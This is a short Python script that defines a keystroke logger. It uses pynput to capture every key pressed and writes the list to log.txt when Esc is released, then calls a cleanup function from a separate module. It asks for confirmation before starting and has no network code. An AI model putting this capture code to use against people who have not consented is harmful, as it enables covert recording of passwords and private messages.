from pynput.keyboard import Key, Listener
from KLcleaner import clean
keys=[]
class KeyLogger():
    def KeyLog(self,input_from_user):
        r=1
        while r==1:
            a=input("Keylogger \nDo you want to start Advance Keylogger (Y/N)")
            if a=='Y':
                print("The Keylogger has started")
                def on_press(key):
                    keys.append(key)
                    return key
                def on_release(key):
                    if key==Key.esc:
                        with open('log.txt','w') as file:
                            file.writelines(str(keys))
                        return False
                with Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()
                clean()
            else:
                r=2
